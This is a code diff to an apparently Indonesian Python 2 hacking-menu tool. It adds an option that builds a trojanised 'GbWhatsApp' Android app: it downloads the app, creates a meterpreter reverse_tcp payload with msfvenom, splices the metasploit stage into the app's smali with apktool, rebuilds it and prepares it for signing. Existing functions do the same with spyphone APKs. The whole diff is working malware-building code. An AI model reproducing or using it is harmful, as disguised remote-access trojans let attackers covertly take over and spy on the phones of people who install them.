@@ -89,6 +89,20 @@ def payload():
 	print hijau+'PLEASE WAIT ...'
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
+def gbwa():
+	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/GbWhatsApp && mv -f GbWhatsApp Malware/A")
+	os.system("cd Malware && rm -rf payload.apk payload A")
+	payload()
+	os.system("cd Malware && apktool d payload.apk -o payload")
+	os.system("rm -rf Malware/A/smali/com/metasploit/stage")
+	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/A/smali/com/metasploit")
+	os.system("cd Malware && apktool b A -o GbWhatsApp.apk")
+	os.system("cd Malware && rm -rf payload.apk payload A")
+	os.system('mv -f Malware/GbWhatsApp.apk /storage/emulated/0/')
+	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+	
+		
+
 def spyphone_V14():
 	os.system("wget http://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
 	os.system("cd Malware && rm -rf payload.apk payload spyphone")
@@ -125,28 +139,31 @@ def awal():
 	pilmal()
 	
 def pilmal():
-    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
-    if zedd == '':
-    	os.system('clear')
-        home()
-    else:
-        if zedd == '1':
-            spyphone()
-        else:
-            if zedd == '2':
-                spyphone_V14()
-            else:
-            	print '\x1b[1;91m[!] Pilih 1-2'
-            	os.system('clear')
-            	awal()
+	zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
+	if zedd == '':
+		os.system('clear')
+		home()
+	else:
+		if zedd == '1':
+			spyphone()
+		else:
+			if zedd == '2':
+				spyphone_V14()
+			else:
+				if zedd == '3':
+					gbwa()
+				else :
+					print '\x1b[1;91m[!] Pilih 1-2'
+					os.system('clear')
+					awal()
             
-
 def malware():
     os.system('clear')
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
     print '\x1b[1;91m2.\x1b[1;97mSpyphone_V14'
+    print '\x1b[1;91m3.\x1b[1;97mGbWhatsApp'
     print '\r\x1b[1;91m__________________________________________«Back» '
     
         	
